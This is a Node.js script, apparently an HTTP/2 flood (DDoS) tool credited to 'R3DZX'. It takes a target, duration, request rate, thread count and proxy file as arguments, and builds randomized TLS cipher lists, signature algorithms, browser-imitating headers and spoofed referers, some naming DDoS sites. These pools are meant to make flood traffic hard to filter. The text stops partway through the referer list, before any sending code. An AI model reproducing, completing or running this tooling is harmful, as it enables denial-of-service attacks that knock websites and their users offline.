// THIS METHODS BY R3DZX
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 var path = require("path");
 const crypto = require("crypto");
 const { HeaderGenerator } = require('header-generator');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

 const headers = {};

 function randomString(length) {
   var result = "";
   var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var charactersLength = characters.length;
   for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   ;
   return result;
 }

 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
}


let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 112, httpVersion: "2" },
        { name: "opera", minVersion: 112, httpVersion: "2" },
        { name: "edge", minVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 112, httpVersion: "2" },
        { name: "safari", minVersion: 16, httpVersion: "2" },
    ],
    devices: [
        "desktop",
        "mobile",
    ],
    operatingSystems: [
        "windows",
        "linux",
        "macos",
        "android",
        "ios",
    ],
    locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders()

const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
];

const hihi = [ "require-corp", "unsafe-none", ];

const sigalgs = [
 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
 'ecdsa_brainpoolP256r1tls13_sha256',
 'ecdsa_brainpoolP384r1tls13_sha384',
 'ecdsa_brainpoolP512r1tls13_sha512',
 'ecdsa_sha1',
 'ed25519',
 'ed448',
 'ecdsa_sha224',
 'rsa_pkcs1_sha1',
 'rsa_pss_pss_sha256',
 'dsa_sha256',
 'dsa_sha384',
 'dsa_sha512',
 'dsa_sha224',
 'dsa_sha1',
 'rsa_pss_pss_sha384',
 'rsa_pkcs1_sha2240',
 'rsa_pss_pss_sha512',
 'sm2sig_sm3',
 'ecdsa_secp521r1_sha512',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    
]

accept_header = [
  'application/json',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
],

encoding_header = [
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  '*'
],

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],

encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
]

controle_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60',
  'public, max-age=31536000',
  'max-age=14400, public',
  'max-age=14400',
  'max-age=600, private',
  'public, s-maxage=600, max-age=60',
  'no-store, no-cache, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
]

const Methods = [
  "GET",
  "HEAD",
  "POST",
  "PUT",
  "DELETE",
  "CONNECT",
  "OPTIONS",
  "TRACE",
  "PATCH",
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

const queryStrings = [
  "&", 
  "=", 
];

const pathts = [
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment", 
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
];

const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
